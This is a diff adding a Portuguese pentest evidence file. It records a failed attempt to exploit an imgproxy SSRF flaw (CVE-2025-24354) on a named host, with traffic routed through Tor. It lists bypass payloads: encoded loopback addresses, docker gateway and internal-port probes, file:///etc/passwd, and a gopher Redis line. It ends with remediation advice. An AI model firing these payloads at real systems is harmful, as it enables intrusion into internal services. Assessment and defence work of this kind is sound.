@@ -1,0 +1,102 @@
+# F-C4 — imgproxy SSRF via 0.0.0.0 (CVE-2025-24354)
+# Status: ❌ NÃO EXPLORÁVEL (bypass 0.0.0.0 bloqueado; imgproxy locked-down)
+
+## Finding
+| Campo | Valor |
+|-------|-------|
+| ID | F-C4 |
+| CVE | CVE-2025-24354 (imgproxy SSRF via 0.0.0.0 — bypass de allowlist/loopback) |
+| Host | img-origin.ggmax.com.br (imgproxy no origin 104.238.205.118) |
+| Severidade (preliminar) | Alta |
+| Severidade (final) | Info — Negado |
+| Fase | 7 (exploit validation) |
+| Data | 2026-09-04T23:52Z |
+
+## Contexto
+Recon passivo/ativo (F-A11) testou SSRF imgproxy com canary EXTERNO e negou (allowlist
+bloqueia fetch outbound). A hipótese do CVE-2025-24354: o endereço `0.0.0.0` bypassa o
+check `IsLoopback()` (que só casa 127.0.0.0/8) e atinge serviços LOCAIS mesmo com allowlist.
+Versões vulneráveis: imgproxy < 3.27.2.
+
+## Reprodução exata (proxychains4 + HTTPS bypass CF + Tor)
+
+### 1) imgproxy confirmado ativo
+```
+/health -> 200 "imgproxy is running" (19 bytes)
+/       -> 404 "Invalid URL" (11 bytes)
+/format -> 400 "Source is unreachable" (21 bytes)  <- imgproxy processa paths
+```
+Formato de source aceito: `/plain/{url}` (NÃO `/unsafe/` — este retorna "Invalid URL",
+unsafe mode DESATIVADO). Baseline externo:
+```
+/plain/http://example.com/image.jpg -> 403 "Source is unreachable" (21 bytes)
+```
+
+### 2) CVE-2025-24354 bypass 0.0.0.0 — TODOS retornam o MESMO erro genérico
+Testadas 11 portas de serviços locais candidatos via `0.0.0.0`:
+```
+:7700 Meilisearch  -> Source is unreachable [403 size=21]
+:80   nginx        -> Source is unreachable [403 size=21]
+:443  TLS interno  -> Source is unreachable [403 size=21]
+:6001 Soketi       -> Source is unreachable [403 size=21]
+:3000 Node         -> Source is unreachable [403 size=21]
+:8080 Coolify-alt  -> Source is unreachable [403 size=21]
+:6379 Redis        -> Source is unreachable [403 size=21]
+:2375 Docker API   -> Source is unreachable [403 size=21]
+:5432 PostgreSQL   -> Source is unreachable [403 size=21]
+:3306 MySQL        -> Source is unreachable [403 size=21]
+:27017 MongoDB     -> Source is unreachable [403 size=21]
+:9999 (porta fechada, controle) -> Source is unreachable [403 size=21]
+```
+
+### 3) Variações de bypass adicionais (porta 80) — TODAS idênticas (~1.7–2.2s)
+```
+http://0.0.0.0:80/                   -> Source is unreachable [403 21B]
+http://localhost:80/                 -> Source is unreachable
+http://127.0.0.1:80/  http://127.1:80/  http://0x7f000001:80/  http://2130706433:80/
+http://[::]:80/  http://[::1]:80/  http://0:80/  http://0000:80/  http://0x00.0x00.0x00.0x00:80/
+http://172.17.0.1:80/  (docker host gateway)
+http://host.docker.internal:80/
+http://104.238.205.118:80/  (próprio IP público do host)
+https://104.238.205.118/            (próprio IP público, HTTPS)
+http://0.0.0.0.nip.io:80/  http://127.0.0.1.nip.io:80/
+-> TODAS retornam "Source is unreachable" [403 size=21] — idêntico a porta fechada :9999
+```
+
+### 4) Schemes não-HTTP e S3 (tentativa de allowlist/S3-source) — TODOS bloqueados
+```
+file:///etc/passwd                   -> Source is unreachable [403 21B]
+gopher://0.0.0.0:6379/_INFO          -> Source is unreachable [403 21B]
+s3://ggmax/keyz  s3://keyz/  s3://ggmax-sa-east-1/test.jpg  gs://ggmax/test
+-> TODOS "Source is unreachable" [403 21B]
+```
+
+## Análise
+- TODOS os sources (loopback, private, docker-gateway, **próprio IP público do host**,
+  file://, gopher://, s3://, externo, porta fechada) retornam a string genérica
+  "Source is unreachable" [403 size=21] com timing idêntico (~2s, dominado pelo Tor).
+- O `0.0.0.0` NÃO produz resposta distinta de uma porta fechada (:9999) → indica que o
+  fetch NÃO chega a acontecer (rejeição em estágio pré-fetch pela proteção SSRF do
+  imgproxy), não "alcançou nginx mas falhou em decodificar".
+- imgproxy está em configuração locked-down: `/unsafe/` desativado, e proteção SSRF
+  bloqueia 0.0.0.0/loopback/private/own-IP uniformemente. Ou é versão patched (>=3.27.2)
+  ou a proteção sempre incluiu 0.0.0.0. Egress externo também bloqueado (example.com falha).
+- Mesmo o `0.0.0.0` (núcleo do CVE-2025-24354) não contorna a proteção.
+
+## Impacto
+NENHUM. SSRF via 0.0.0.0 NÃO é explorável. Não há como atingir Meilisearch/Docker/Redis/
+nginx internos através do imgproxy. (Pivoting interno via imgproxy descartado.)
+
+## Recomendação
+1. Manter imgproxy atualizado (>=3.27.2) e `/unsafe/` desativado (já está).
+2. Restringir img-origin.ggmax.com.br a não expor o imgproxy sem WAF (origin direto).
+3. Confirmar que `IMGPROXY_ALLOWED_SOURCES` está definido (deny-by-default) e que egress
+   externo do container imgproxy é bloqueado (já observado).
+
+## Artefatos
+- `exploit/pocs/cve-2025-24354_ssrf_test.sh` (adaptado: proxychains4 + HTTPS)
+- Logs inline nesta evidência (todos os probes).
+
+## Conclusão
+❌ CVE-2025-24354 — **NÃO explorável**. Bypass `0.0.0.0` bloqueado; imgproxy locked-down.
+Promover F-A11 (Info) + F-C4 (Alta preliminar) → ambas Info/Negado.
